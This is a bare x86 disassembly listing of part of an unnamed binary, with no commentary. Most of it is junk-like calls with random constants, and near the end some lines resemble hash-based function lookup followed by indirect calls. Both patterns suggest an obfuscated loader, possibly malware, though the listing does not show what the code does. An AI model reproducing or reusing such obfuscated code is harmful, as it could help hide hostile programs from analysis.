  41cf94:	add    DWORD PTR [ebp-0x4],eax
  41cf97:	mov    DWORD PTR [ebp-0x3c],eax
  41cf9a:	cmp    eax,0xe
  41cf9d:	jne    0x41cfaa
  41cf9f:	xor    esi,esi
  41cfa1:	push   esi
  41cfa2:	call   0x41ebd3
  41cfa7:	add    esp,0x4
  41cfaa:	push   0x42b09c
  41cfaf:	call   DWORD PTR ds:0x4293e8
  41cfb5:	sub    esi,ebx
  41cfb7:	mov    edx,DWORD PTR [ebp-0x48]
  41cfba:	mov    edi,DWORD PTR ds:0x42b09c
  41cfc0:	sub    edi,ebx
  41cfc2:	add    edi,edx
  41cfc4:	sub    DWORD PTR [ebp-0x4],edi
  41cfc7:	and    esi,edx
  41cfc9:	sub    esi,eax
  41cfcb:	sub    DWORD PTR [ebp-0x4],esi
  41cfce:	mov    DWORD PTR [ebp-0x10],eax
  41cfd1:	push   eax
  41cfd2:	push   esi
  41cfd3:	push   edi
  41cfd4:	push   0x50
  41cfd6:	call   0x41f075
  41cfdb:	add    esp,0x10
  41cfde:	push   ebx
  41cfdf:	push   esi
  41cfe0:	push   edx
  41cfe1:	push   0xffffffc7
  41cfe3:	push   0x53
  41cfe5:	call   0x41f3d2
  41cfea:	add    esp,0x14
  41cfed:	call   DWORD PTR ds:0x42938c
  41cff3:	sub    edi,esi
  41cff5:	or     edi,eax
  41cff7:	sub    edi,eax
  41cff9:	add    DWORD PTR [ebp-0x48],edi
  41cffc:	test   eax,0x2d58
  41d001:	je     0x41d2bf
  41d007:	push   0x42d56800
  41d00c:	call   0x41f1c7
  41d011:	add    esp,0x4
  41d014:	call   0x41eccc
  41d019:	mov    ebx,DWORD PTR ds:0x42b0b8
  41d01f:	push   0x9
  41d021:	push   edi
  41d022:	push   0xffffffb8
  41d024:	push   0xea956900
  41d029:	push   0x55
  41d02b:	call   0x41ea3e
  41d030:	add    esp,0x14
  41d033:	push   ebx
  41d034:	push   0x4aa5ae00
  41d039:	push   eax
  41d03a:	push   0x7e013d00
  41d03f:	call   0x41f3d2
  41d044:	add    esp,0x10
  41d047:	mov    ecx,0x2440041
  41d04c:	push   0x1687ed00
  41d051:	push   0x7ee2b200
  41d056:	push   0x7eec3000
  41d05b:	push   0x7
  41d05d:	push   0xffffff95
  41d05f:	call   0x41ee25
  41d064:	add    esp,0x14
  41d067:	add    ebx,ebx
  41d069:	sub    eax,edi
  41d06b:	add    eax,ebx
  41d06d:	push   eax
  41d06e:	push   edi
  41d06f:	call   0x41ef3e
  41d074:	add    esp,0x8
  41d077:	mov    ecx,DWORD PTR ds:0x42b0b8
  41d07d:	push   0xffffffa4
  41d07f:	call   0x41f7ae
  41d084:	add    esp,0x4
  41d087:	xor    esi,esi
  41d089:	mov    ecx,0xb3fe
  41d08e:	sub    ecx,edi
  41d090:	push   0xbefb2c00
  41d095:	push   ecx
  41d096:	push   ecx
  41d097:	push   eax
  41d098:	push   0xec0bf400
  41d09d:	call   0x41ef3e
  41d0a2:	add    esp,0x14
  41d0a5:	push   0x4c432800
  41d0aa:	push   ebx
  41d0ab:	push   0x6e
  41d0ad:	push   0xffffffd9
  41d0af:	call   0x41ee25
  41d0b4:	add    esp,0x10
  41d0b7:	or     DWORD PTR [ebp-0x4],edi
  41d0ba:	sub    ebx,esi
  41d0bc:	push   0x6ef8cb00
  41d0c1:	call   0x41ee25
  41d0c6:	add    esp,0x4
  41d0c9:	mov    DWORD PTR [ebp-0x4],ebx
  41d0cc:	call   0x41fa1f
  41d0d1:	sub    ebx,esi
  41d0d3:	add    eax,eax
  41d0d5:	add    eax,edi
  41d0d7:	push   eax
  41d0d8:	push   0x4b
  41d0da:	push   0x20
  41d0dc:	push   0xe6499200
  41d0e1:	call   0x41f2ed
  41d0e6:	add    esp,0x10
  41d0e9:	call   0x41ea3e
  41d0ee:	sub    esi,ebx
  41d0f0:	push   ebx
  41d0f1:	push   eax
  41d0f2:	push   0xb6ad1600
  41d0f7:	push   ebx
  41d0f8:	push   0xffffffd2
  41d0fa:	call   0x41f2ed
  41d0ff:	add    esp,0x14
  41d102:	add    DWORD PTR [ebp-0x48],esi
  41d105:	add    esi,ebx
  41d107:	mov    edx,0xa7
  41d10c:	push   edx
  41d10d:	push   ebx
  41d10e:	push   0x1f
  41d110:	push   0x1a
  41d112:	push   0xeea52d00
  41d117:	call   0x41f7ae
  41d11c:	add    esp,0x14
  41d11f:	push   eax
  41d120:	push   edi
  41d121:	push   0xf6e79400
  41d126:	push   ebx
  41d127:	call   0x41ee25
  41d12c:	add    esp,0x10
  41d12f:	and    esi,ebx
  41d131:	mov    ecx,DWORD PTR [ebp-0x48]
  41d134:	add    ecx,edi
  41d136:	add    DWORD PTR [ebp-0x48],ecx
  41d139:	push   0x23
  41d13b:	push   eax
  41d13c:	call   0x41eccc
  41d141:	add    esp,0x8
  41d144:	push   esi
  41d145:	call   0x41f3d2
  41d14a:	add    esp,0x4
  41d14d:	add    esi,ebx
  41d14f:	mov    DWORD PTR [ebp-0x4],esi
  41d152:	push   0x7e0c9a00
  41d157:	push   eax
  41d158:	push   0x6c5bc300
  41d15d:	push   0x46978500
  41d162:	push   ebx
  41d163:	call   0x41f2ed
  41d168:	add    esp,0x14
  41d16b:	sub    esi,ebx
  41d16d:	push   0x50
  41d16f:	push   0xffffffb0
  41d171:	call   0x41fb7d
  41d176:	add    esp,0x8
  41d179:	push   edi
  41d17a:	push   0x56aa1d00
  41d17f:	call   0x41ebd3
  41d184:	add    esp,0x8
  41d187:	push   0x5e150800
  41d18c:	push   0x75
  41d18e:	push   0x70
  41d190:	call   0x41ef3e
  41d195:	add    esp,0xc
  41d198:	sub    esi,ebx
  41d19a:	mov    ecx,DWORD PTR [ebp-0x4]
  41d19d:	sub    ecx,esi
  41d19f:	mov    edi,0xf3
  41d1a4:	add    DWORD PTR [ebp-0x4],ebx
  41d1a7:	cmp    ecx,esi
  41d1a9:	jne    0x41d1ca
  41d1ab:	push   0xfffffff7
  41d1ad:	push   esi
  41d1ae:	push   0xffffffd8
  41d1b0:	push   0x17
  41d1b2:	call   0x41ee25
  41d1b7:	add    esp,0x10
  41d1ba:	push   0xffffffc5
  41d1bc:	push   eax
  41d1bd:	push   0x69
  41d1bf:	call   0x41eccc
  41d1c4:	add    esp,0xc
  41d1c7:	add    DWORD PTR [ebp-0x48],edi
  41d1ca:	call   0x41ea3e
  41d1cf:	add    esi,ebx
  41d1d1:	push   0x72
  41d1d3:	push   0x7add6400
  41d1d8:	call   0x41f3d2
  41d1dd:	add    esp,0x8
  41d1e0:	push   0xe62e9100
  41d1e5:	push   edi
  41d1e6:	call   0x41f7ae
  41d1eb:	add    esp,0x8
  41d1ee:	mov    ecx,ebx
  41d1f0:	add    DWORD PTR [ebp-0x48],ecx
  41d1f3:	mov    DWORD PTR [ebp-0x44],ebx
  41d1f6:	mov    edi,0x496b
  41d1fb:	push   0x6e845700
  41d200:	call   0x41f3d2
  41d205:	add    esp,0x4
  41d208:	push   0x261e7500
  41d20d:	call   0x41ef3e
  41d212:	add    esp,0x4
  41d215:	sub    DWORD PTR [ebp-0x48],edi
  41d218:	push   0xffffff98
  41d21a:	push   0x66075c00
  41d21f:	call   0x41ea3e
  41d224:	add    esp,0x8
  41d227:	sub    esi,ebx
  41d229:	cmp    eax,0xea06
  41d22e:	jne    0x41d23f
  41d230:	push   0x63
  41d232:	push   0x7e4a6800
  41d237:	call   0x41f075
  41d23c:	add    esp,0x8
  41d23f:	call   0x41fa1f
  41d244:	add    esi,esi
  41d246:	mov    ecx,DWORD PTR ds:0x42b09c
  41d24c:	push   eax
  41d24d:	push   0x6b
  41d24f:	push   0xa67d7e00
  41d254:	call   0x41ebd3
  41d259:	add    esp,0xc
  41d25c:	push   0xde1d8400
  41d261:	call   0x41f3d2
  41d266:	add    esp,0x4
  41d269:	add    eax,ebx
  41d26b:	mov    edx,DWORD PTR ds:0x42b0b8
  41d271:	call   0x41eccc
  41d276:	add    ebx,esi
  41d278:	push   0x33
  41d27a:	call   0x41f2ed
  41d27f:	add    esp,0x4
  41d282:	push   0x52ce7100
  41d287:	push   esi
  41d288:	push   ebx
  41d289:	push   eax
  41d28a:	call   0x41fb7d
  41d28f:	add    esp,0x10
  41d292:	push   0xcc43b700
  41d297:	call   0x41f075
  41d29c:	add    esp,0x4
  41d29f:	add    DWORD PTR [ebp-0x44],ebx
  41d2a2:	push   0x21
  41d2a4:	push   0x26051b00
  41d2a9:	push   0x29
  41d2ab:	call   0x41f2ed
  41d2b0:	add    esp,0xc
  41d2b3:	push   0xffffffce
  41d2b5:	push   0x65
  41d2b7:	call   0x41ee25
  41d2bc:	add    esp,0x8
  41d2bf:	cmp    eax,0xffffffe9
  41d2c2:	jne    0x41d301
  41d2c4:	mov    edi,0x6c2a
  41d2c9:	push   eax
  41d2ca:	call   0x41fa1f
  41d2cf:	add    esp,0x4
  41d2d2:	push   0xbe8e5400
  41d2d7:	call   0x41f2ed
  41d2dc:	add    esp,0x4
  41d2df:	push   ebx
  41d2e0:	push   0x66
  41d2e2:	call   0x41ea3e
  41d2e7:	add    esp,0x8
  41d2ea:	push   0xffffffbb
  41d2ec:	push   0xffffffaf
  41d2ee:	push   0xffffff86
  41d2f0:	call   0x41eccc
  41d2f5:	add    esp,0xc
  41d2f8:	push   edi
  41d2f9:	call   0x41f075
  41d2fe:	add    esp,0x4
  41d301:	push   eax
  41d302:	push   eax
  41d303:	call   0x41f3d2
  41d308:	add    esp,0x8
  41d30b:	push   0xec39a900
  41d310:	push   0xffffff90
  41d312:	push   ebx
  41d313:	push   ebx
  41d314:	push   0xffffffea
  41d316:	call   0x41f7ae
  41d31b:	add    esp,0x14
  41d31e:	push   0x26
  41d320:	push   0x0
  41d322:	call   DWORD PTR ds:0x429384
  41d328:	mov    edi,DWORD PTR [ebp-0x4]
  41d32b:	add    DWORD PTR [ebp-0x48],edi
  41d32e:	cmp    eax,DWORD PTR [ebp-0x10]
  41d331:	jne    0x41d39d
  41d333:	cmp    eax,esi
  41d335:	je     0x41d341
  41d337:	push   0xffffffb0
  41d339:	call   0x41ea3e
  41d33e:	add    esp,0x4
  41d341:	push   0x2663c000
  41d346:	push   0x8a890800
  41d34b:	push   0x39
  41d34d:	call   0x41f3d2
  41d352:	add    esp,0xc
  41d355:	mov    eax,0x26
  41d35a:	mov    edx,DWORD PTR ds:0x42b09c
  41d360:	xor    ebx,ebx
  41d362:	sub    edx,esi
  41d364:	or     edx,esi
  41d366:	add    DWORD PTR [ebp-0x4],edx
  41d369:	and    DWORD PTR [ebp-0x48],ebx
  41d36c:	mov    esi,DWORD PTR [ebp-0x4]
  41d36f:	mov    ebx,eax
  41d371:	sub    ebx,edi
  41d373:	add    DWORD PTR [ebp-0x48],esi
  41d376:	cmp    edi,0xffffffdd
  41d379:	jne    0x41d37e
  41d37b:	add    DWORD PTR [ebp-0x4],ebx
  41d37e:	mov    DWORD PTR [ebp-0x38],eax
  41d381:	push   0x9c72d000
  41d386:	call   0x41f7ae
  41d38b:	add    esp,0x4
  41d38e:	push   edx
  41d38f:	push   edx
  41d390:	push   0x5e148a00
  41d395:	call   0x41eccc
  41d39a:	add    esp,0xc
  41d39d:	call   0x41f2ed
  41d3a2:	push   0x2c
  41d3a4:	push   ebx
  41d3a5:	push   0x7e4d5500
  41d3aa:	push   0x18
  41d3ac:	push   0xffffffd3
  41d3ae:	call   0x41fb7d
  41d3b3:	add    esp,0x14
  41d3b6:	push   ebx
  41d3b7:	push   0xffffffec
  41d3b9:	push   0xcc18df00
  41d3be:	call   0x41f2ed
  41d3c3:	add    esp,0xc
  41d3c6:	mov    ecx,DWORD PTR ds:0x42b0b8
  41d3cc:	mov    eax,0xb06f
  41d3d1:	push   0x4f
  41d3d3:	push   esi
  41d3d4:	push   0xffffffb7
  41d3d6:	push   esi
  41d3d7:	call   0x41ebd3
  41d3dc:	add    esp,0x10
  41d3df:	push   0xdeda4c00
  41d3e4:	push   0x92ad5100
  41d3e9:	call   0x41f7ae
  41d3ee:	add    esp,0x8
  41d3f1:	call   0x41fb7d
  41d3f6:	sub    DWORD PTR [ebp-0x4],esi
  41d3f9:	push   0xfffffff6
  41d3fb:	push   0x7e6cf300
  41d400:	push   ebx
  41d401:	call   0x41ea3e
  41d406:	add    esp,0xc
  41d409:	mov    edx,esi
  41d40b:	push   0xe
  41d40d:	push   0xb2c37200
  41d412:	call   0x41ea3e
  41d417:	add    esp,0x8
  41d41a:	mov    eax,edi
  41d41c:	push   0xffffffd0
  41d41e:	call   0x41ea3e
  41d423:	add    esp,0x4
  41d426:	mov    ebx,DWORD PTR [ebp-0x4]
  41d429:	mov    ecx,DWORD PTR [ebp-0x4]
  41d42c:	push   0x969be700
  41d431:	push   0xb6addc00
  41d436:	push   0x25
  41d438:	call   0x41eccc
  41d43d:	add    esp,0xc
  41d440:	sub    DWORD PTR [ebp-0x4],ebx
  41d443:	cmp    eax,edi
  41d445:	je     0x41d459
  41d447:	push   ebx
  41d448:	push   0xffffffa1
  41d44a:	push   esi
  41d44b:	push   0xe624a100
  41d450:	push   esi
  41d451:	call   0x41f7ae
  41d456:	add    esp,0x14
  41d459:	xor    esi,esi
  41d45b:	push   0x32a19f00
  41d460:	push   eax
  41d461:	push   0x2c
  41d463:	push   edi
  41d464:	push   esi
  41d465:	call   0x41f075
  41d46a:	add    esp,0x14
  41d46d:	xor    ebx,ebx
  41d46f:	sub    ebx,eax
  41d471:	push   edi
  41d472:	call   0x41ee25
  41d477:	add    esp,0x4
  41d47a:	mov    ecx,0xe559
  41d47f:	sub    ecx,esi
  41d481:	test   ebx,0x4c
  41d487:	je     0x41d4b4
  41d489:	mov    eax,DWORD PTR [ebp-0x4]
  41d48c:	xor    esi,esi
  41d48e:	push   ebx
  41d48f:	push   0xde001900
  41d494:	push   0xc2f3d300
  41d499:	push   0xffffff8f
  41d49b:	call   0x41f075
  41d4a0:	add    esp,0x10
  41d4a3:	push   edi
  41d4a4:	push   0xfffffff4
  41d4a6:	push   ebx
  41d4a7:	push   0xffffff80
  41d4a9:	call   0x41ee25
  41d4ae:	add    esp,0x10
  41d4b1:	add    DWORD PTR [ebp-0x4],esi
  41d4b4:	push   0xbc57f900
  41d4b9:	push   0xd6fa0d00
  41d4be:	call   0x41ef3e
  41d4c3:	add    esp,0x8
  41d4c6:	call   0x41ea3e
  41d4cb:	push   0xffffffe9
  41d4cd:	call   0x41ea3e
  41d4d2:	add    esp,0x4
  41d4d5:	cmp    edi,DWORD PTR ds:0x42b09c
  41d4db:	jne    0x41d4eb
  41d4dd:	push   edi
  41d4de:	push   0xe6808300
  41d4e3:	call   0x41fb7d
  41d4e8:	add    esp,0x8
  41d4eb:	push   0x5e202e00
  41d4f0:	push   0x2609f200
  41d4f5:	call   0x41ea3e
  41d4fa:	add    esp,0x8
  41d4fd:	push   0x4ef25200
  41d502:	push   esi
  41d503:	push   0x5e803000
  41d508:	call   0x41f075
  41d50d:	add    esp,0xc
  41d510:	push   0xffffff8d
  41d512:	call   0x41f1c7
  41d517:	add    esp,0x4
  41d51a:	push   0x54
  41d51c:	push   0xffffffaf
  41d51e:	push   ebx
  41d51f:	push   esi
  41d520:	call   0x41ef3e
  41d525:	add    esp,0x10
  41d528:	push   0x46
  41d52a:	push   ebx
  41d52b:	push   0x2ee57a00
  41d530:	push   0xfffffffc
  41d532:	push   ebx
  41d533:	call   0x41eccc
  41d538:	add    esp,0x14
  41d53b:	push   0xeefa4f00
  41d540:	push   0xffffffe6
  41d542:	push   0xe
  41d544:	push   0x6e
  41d546:	call   0x41ebd3
  41d54b:	add    esp,0x10
  41d54e:	push   0x13
  41d550:	call   0x41f7ae
  41d555:	add    esp,0x4
  41d558:	push   0xffffffc8
  41d55a:	push   0xde09e500
  41d55f:	push   0xfffffffb
  41d561:	call   0x41ebd3
  41d566:	add    esp,0xc
  41d569:	push   0xffffffe1
  41d56b:	push   0x9c589400
  41d570:	push   esi
  41d571:	call   0x41fa1f
  41d576:	add    esp,0xc
  41d579:	mov    eax,DWORD PTR ds:0x42b0b8
  41d57f:	add    DWORD PTR [ebp-0x4],eax
  41d582:	push   0x7e3abd00
  41d587:	call   0x41f7ae
  41d58c:	add    esp,0x4
  41d58f:	call   0x41f2ed
  41d594:	lea    esi,[ebp-0x2c]
  41d597:	push   0x5e361600
  41d59c:	push   ebx
  41d59d:	push   0x62fc8400
  41d5a2:	push   0xca822900
  41d5a7:	push   eax
  41d5a8:	call   0x41fb7d
  41d5ad:	add    esp,0x14
  41d5b0:	call   0x41eccc
  41d5b5:	mov    eax,DWORD PTR [ebp-0x4]
  41d5b8:	push   0x74
  41d5ba:	push   0x3c2d9e00
  41d5bf:	call   0x41f3d2
  41d5c4:	add    esp,0x8
  41d5c7:	push   0x5b
  41d5c9:	push   0xffffffe3
  41d5cb:	push   0x26275100
  41d5d0:	push   esi
  41d5d1:	push   0xe64d4700
  41d5d6:	call   0x41fa1f
  41d5db:	add    esp,0x14
  41d5de:	push   esi
  41d5df:	push   0x14
  41d5e1:	push   0xfc291f00
  41d5e6:	call   0x41ebd3
  41d5eb:	add    esp,0x8
  41d5ee:	push   0x7fcfdfc1
  41d5f3:	mov    edi,DWORD PTR [ebp-0x4]
  41d5f6:	mov    ebx,DWORD PTR [ebp-0x4]
  41d5f9:	push   0x48
  41d5fb:	push   eax
  41d5fc:	push   ebx
  41d5fd:	push   esi
  41d5fe:	push   0x71
  41d600:	call   0x41f075
  41d605:	add    esp,0x14
  41d608:	call   0x41f075
  41d60d:	add    edi,edi
  41d60f:	push   esi
  41d610:	push   0xffffffaf
  41d612:	push   esi
  41d613:	push   ebx
  41d614:	call   0x41f7ae
  41d619:	add    esp,0x10
  41d61c:	push   0x8ec9ee00
  41d621:	call   0x41f3d2
  41d626:	add    esp,0x4
  41d629:	push   eax
  41d62a:	call   0x41fa1f
  41d62f:	add    esp,0x4
  41d632:	push   0xee8b2300
  41d637:	push   0x7e20e600
  41d63c:	push   0x2ba8500
  41d641:	push   ebx
  41d642:	call   0x41f3d2
  41d647:	add    esp,0x10
  41d64a:	add    edi,eax
  41d64c:	sub    edi,eax
  41d64e:	push   0xdeeb9500
  41d653:	push   0x4c7cac00
  41d658:	push   eax
  41d659:	call   0x41f1c7
  41d65e:	add    esp,0xc
  41d661:	push   0x3e
  41d663:	push   0x6c689600
  41d668:	push   ebx
  41d669:	push   0x2e8adc00
  41d66e:	call   0x41ea3e
  41d673:	add    esp,0x10
  41d676:	push   0xffffff89
  41d678:	push   0x6a
  41d67a:	call   0x41ea3e
  41d67f:	add    esp,0x8
  41d682:	add    edi,ebx
  41d684:	cmp    edi,0x3c
  41d687:	jne    0x41d697
  41d689:	push   0x78
  41d68b:	push   0xffffff8b
  41d68d:	push   edi
  41d68e:	push   ebx
  41d68f:	call   0x41ea3e
  41d694:	add    esp,0x10
  41d697:	push   0x2c4b9a00
  41d69c:	push   0xffffff8c
  41d69e:	push   ebx
  41d69f:	push   esi
  41d6a0:	call   0x41eccc
  41d6a5:	add    esp,0x10
  41d6a8:	push   0x78
  41d6aa:	push   ebx
  41d6ab:	push   0x19
  41d6ad:	call   0x41fb7d
  41d6b2:	add    esp,0xc
  41d6b5:	call   0x41d972
  41d6ba:	push   esi
  41d6bb:	push   0xfffffff7
  41d6bd:	call   0x41f2ed
  41d6c2:	add    esp,0x8
  41d6c5:	call   0x41fb7d
  41d6ca:	mov    ebx,DWORD PTR [ebp-0x2c]
  41d6cd:	mov    edx,0x5e
  41d6d2:	xor    edi,edi
  41d6d4:	push   0xffffffb1
  41d6d6:	call   0x41ebd3
  41d6db:	add    esp,0x4
  41d6de:	push   ebx
  41d6df:	push   0xe6339e00
  41d6e4:	call   0x41ea3e
  41d6e9:	add    esp,0x8
  41d6ec:	push   0xb6bf3800
  41d6f1:	push   0x62a9d600
  41d6f6:	push   0x6c0fb600
  41d6fb:	call   0x41f3d2
  41d700:	add    esp,0xc
  41d703:	push   0x7e1f6300
  41d708:	push   0xaa5df00
  41d70d:	push   ebx
  41d70e:	push   edi
  41d70f:	push   0xffffffee
  41d711:	call   0x41eccc
  41d716:	add    esp,0x14
  41d719:	shr    ebx,0x10
  41d71c:	push   0x26393c00
  41d721:	call   0x41f075
  41d726:	add    esp,0x4
  41d729:	push   0x9c2c0500
  41d72e:	push   0xffffffe0
  41d730:	push   0xa2b31c00
  41d735:	push   0xffffff9b
  41d737:	push   0x6639a600
  41d73c:	call   0x41f3d2
  41d741:	add    esp,0x14
  41d744:	cmp    ebx,0x7968
  41d74a:	jne    0x41d8c6
  41d750:	push   0x46cb7c00
  41d755:	call   0x41ebd3
  41d75a:	add    esp,0x4
  41d75d:	mov    edi,0x79aaa3b7
  41d762:	push   eax
  41d763:	push   0xfee9db00
  41d768:	push   edi
  41d769:	push   0x7e6cf800
  41d76e:	push   0x66e03400
  41d773:	call   0x41ea3e
  41d778:	add    esp,0x14
  41d77b:	push   0xce81d700
  41d780:	push   0xffffffd4
  41d782:	call   0x41ea3e
  41d787:	add    esp,0x8
  41d78a:	sub    edi,DWORD PTR [ebp-0x2c]
  41d78d:	mov    ecx,DWORD PTR ds:0x42b0b8
  41d793:	push   eax
  41d794:	push   0x3a95fc00
  41d799:	push   0x7e6b7f00
  41d79e:	push   0xffffffce
  41d7a0:	call   0x41f075
  41d7a5:	add    esp,0x10
  41d7a8:	call   edi
  41d7aa:	test   edi,0x29
  41d7b0:	je     0x41d7ba
  41d7b2:	cmp    esi,DWORD PTR [ebp-0x4]
  41d7b5:	jne    0x41d7ba
  41d7b7:	xor    DWORD PTR [ebp-0x4],edi
  41d7ba:	mov    DWORD PTR [ebp-0x14],eax
  41d7bd:	push   esi
  41d7be:	push   0xfffffff1
  41d7c0:	push   0x6c7d7300
  41d7c5:	call   0x41f3d2
  41d7ca:	add    esp,0xc
  41d7cd:	push   edi
  41d7ce:	push   0x665c7a00
  41d7d3:	push   0x36906700
  41d7d8:	push   0xeab28300
  41d7dd:	call   0x41fa1f
  41d7e2:	add    esp,0x10
  41d7e5:	mov    ecx,0x41e13e
  41d7ea:	mov    edx,0x47
  41d7ef:	add    edx,esi
  41d7f1:	cmp    edx,DWORD PTR [ebp-0x30]
  41d7f4:	je     0x41d840
  41d7f6:	mov    ebx,DWORD PTR [ebp-0x48]
  41d7f9:	cmp    edi,0x54
  41d7fc:	jne    0x41d840
  41d7fe:	sub    DWORD PTR [ebp-0x48],ebx
  41d801:	sub    DWORD PTR [ebp-0x48],ecx
  41d804:	add    edx,ecx
  41d806:	mov    esi,DWORD PTR [ebp-0x4]
  41d809:	cmp    eax,esi
  41d80b:	jne    0x41d840
  41d80d:	cmp    esi,0x30
  41d810:	jne    0x41d840
  41d812:	cmp    edx,0x6b
  41d815:	jne    0x41d840
  41d817:	add    esi,eax
  41d819:	add    esi,edx
  41d81b:	mov    ebx,DWORD PTR [ebp-0x4]
  41d81e:	sub    DWORD PTR [ebp-0x48],ecx
  41d821:	mov    edi,0xdb
  41d826:	or     ebx,eax
  41d828:	cmp    ebx,DWORD PTR ds:0x42b09c
  41d82e:	je     0x41d840
  41d830:	and    edi,esi
  41d832:	and    edi,ecx
  41d834:	add    edi,ebx
  41d836:	xor    edx,edx
  41d838:	add    edx,ebx
  41d83a:	sub    DWORD PTR [ebp-0x4],edx
  41d83d:	add    DWORD PTR [ebp-0x48],edi
  41d840:	push   DWORD PTR [ebp-0x2c]
  41d843:	push   0x796a2dad
  41d848:	push   DWORD PTR [ebp-0x14]
  41d84b:	call   ecx
  41d84d:	push   0xde8a5f00
  41d852:	push   0xaa77100
  41d857:	call   0x41f075
  41d85c:	add    esp,0x8
  41d85f:	push   esi
  41d860:	push   0x19
  41d862:	push   0x50
  41d864:	call   0x41eccc
  41d869:	add    esp,0xc
  41d86c:	add    DWORD PTR [ebp-0x14],0x20
  41d873:	sub    edi,eax
  41d875:	cmp    edi,0xffffffb8
  41d878:	je     0x41d87f
  41d87a:	sub    edi,eax
  41d87c:	sub    DWORD PTR [ebp-0x48],edi
  41d87f:	push   0x7e186600
  41d884:	push   0xffffff8a
  41d886:	push   0xffffff90
  41d888:	push   eax
  41d889:	call   0x41ee25
  41d88e:	add    esp,0x10
  41d891:	mov    ecx,DWORD PTR [ebp-0x14]
  41d894:	sub    DWORD PTR [ebp-0x4],edi
  41d897:	call   ecx
  41d899:	cmp    edi,0x20
  41d89c:	je     0x41d8a5
  41d89e:	add    ebx,esi
  41d8a0:	and    ebx,esi
  41d8a2:	and    DWORD PTR [ebp-0x48],ebx
  41d8a5:	call   0x41f7ae
  41d8aa:	sub    DWORD PTR [ebp-0x4],esi
  41d8ad:	push   eax
  41d8ae:	push   0xbaa2c800
  41d8b3:	push   0x1c345f00
  41d8b8:	push   ebx
  41d8b9:	push   0x6c4fa200
  41d8be:	call   0x41eccc
  41d8c3:	add    esp,0x14
  41d8c6:	push   0xffffffc6
  41d8c8:	push   0x3e
  41d8ca:	push   esi
  41d8cb:	call   0x41ea3e
  41d8d0:	add    esp,0xc
  41d8d3:	call   0x41ee25
  41d8d8:	push   ebx
  41d8d9:	push   0x1f
  41d8db:	push   0x11
  41d8dd:	push   edi
  41d8de:	push   ebx
  41d8df:	call   0x41ef3e
  41d8e4:	add    esp,0x14
  41d8e7:	call   0x41f075
  41d8ec:	xor    ebx,ebx
  41d8ee:	push   ebx
  41d8ef:	push   0xffffffd8
  41d8f1:	push   0x32904500
  41d8f6:	call   0x41f075
  41d8fb:	add    esp,0xc
  41d8fe:	pop    edi
  41d8ff:	push   0xffffffa8
  41d901:	call   0x41f3d2
  41d906:	add    esp,0x4
  41d909:	call   0x41ebd3
  41d90e:	pop    esi
  41d90f:	add    ebx,esi
  41d911:	push   0xe66e6500
  41d916:	push   0xaab5f400
  41d91b:	push   0x62e61600
  41d920:	call   0x41ebd3
  41d925:	add    esp,0xc
  41d928:	mov    eax,DWORD PTR [ebp-0x4]
  41d92b:	mov    ecx,0x162c
  41d930:	push   0xffffffa5
  41d932:	push   0x667f3000
  41d937:	call   0x41fb7d
  41d93c:	add    esp,0x8
  41d93f:	push   0x73
  41d941:	push   ebx
  41d942:	push   0x42a72700
  41d947:	push   0x16
  41d949:	call   0x41fa1f
  41d94e:	add    esp,0x10
  41d951:	push   eax
  41d952:	push   ebx
  41d953:	call   0x41f2ed
  41d958:	add    esp,0x8
  41d95b:	pop    ebx
  41d95c:	push   0x4d
  41d95e:	push   0x3c7cd900
  41d963:	call   0x41f075
  41d968:	add    esp,0x8
  41d96b:	leave  
  41d96c:	ret    
  41d96d:	int3   
  41d96e:	int3   
  41d96f:	int3   
  41d970:	int3   
  41d971:	int3   
  41d972:	push   ebp
  41d973:	mov    ebp,esp
  41d975:	sub    esp,0x44
  41d978:	call   0x41f1c7
  41d97d:	push   0xffffffa9
  41d97f:	push   0x6c
  41d981:	push   0xffffffc5
  41d983:	push   0x58
  41d985:	call   0x41fa1f
  41d98a:	add    esp,0x10
  41d98d:	push   ebx
  41d98e:	call   0x41f7ae
  41d993:	call   0x41eccc
  41d998:	push   esi
  41d999:	mov    esi,0x44
  41d99e:	push   0xffffffdf
  41d9a0:	push   0xffffff96
  41d9a2:	push   0x7e757700
  41d9a7:	push   0x18
  41d9a9:	call   0x41eccc
  41d9ae:	add    esp,0x10
  41d9b1:	push   0x2d
  41d9b3:	call   0x41ee25
  41d9b8:	add    esp,0x4
  41d9bb:	push   esi
  41d9bc:	push   esi
  41d9bd:	push   esi
  41d9be:	call   0x41f1c7
  41d9c3:	add    esp,0xc
  41d9c6:	push   0x5eefba00
  41d9cb:	push   0x5f
  41d9cd:	push   0xac5bb500
  41d9d2:	push   0xffffffca
  41d9d4:	push   0x9ee51400
  41d9d9:	call   0x41f075
  41d9de:	add    esp,0x14
  41d9e1:	push   edi
  41d9e2:	add    eax,eax
  41d9e4:	mov    DWORD PTR [ebp-0x18],eax
  41d9e7:	push   0x1e
  41d9e9:	push   0x2
  41d9eb:	call   0x41f3d2
  41d9f0:	add    esp,0x8
  41d9f3:	push   esi
  41d9f4:	push   esi
  41d9f5:	push   0xffffffbd
  41d9f7:	push   0x32dbad00
  41d9fc:	push   0x22a8aa00
  41da01:	call   0x41f075
  41da06:	add    esp,0x14
  41da09:	push   esi
  41da0a:	push   0x75
  41da0c:	push   0xffffff8b
  41da0e:	call   0x41eccc
  41da13:	add    esp,0xc
  41da16:	mov    DWORD PTR [ebp-0x38],0xc71dee70
  41da1d:	mov    eax,DWORD PTR [ebp-0x18]
  41da20:	push   0x51
  41da22:	push   0x3b
  41da24:	push   0x9ae68000
  41da29:	push   esi
  41da2a:	call   0x41fb7d
  41da2f:	add    esp,0x10
  41da32:	call   0x41f2ed
  41da37:	call   0x41ded2
  41da3c:	add    esi,eax
  41da3e:	and    esi,eax
  41da40:	test   esi,0xa9
  41da46:	jne    0x41da78
  41da48:	cmp    esi,0x518d
  41da4e:	je     0x41da78
  41da50:	sub    esi,eax
  41da52:	cmp    esi,DWORD PTR ds:0x42b064
  41da58:	je     0x41da78
  41da5a:	mov    edi,DWORD PTR ds:0x42b064
  41da60:	mov    ecx,0x52
  41da65:	add    DWORD PTR [ebp-0x18],edi
  41da68:	add    DWORD PTR [ebp-0x18],ecx
  41da6b:	cmp    esi,DWORD PTR ds:0x42b064
  41da71:	je     0x41da78
  41da73:	add    esi,esi
  41da75:	sub    DWORD PTR [ebp-0x18],esi
  41da78:	mov    DWORD PTR [ebp-0x20],eax
  41da7b:	mov    ecx,0xfaad
  41da80:	push   0xffffff96
  41da82:	push   eax
  41da83:	push   0xde034d00
  41da88:	call   0x41fa1f
  41da8d:	add    esp,0xc
  41da90:	call   0x41ded2
  41da95:	cmp    esi,DWORD PTR ds:0x42b064
  41da9b:	jne    0x41daad
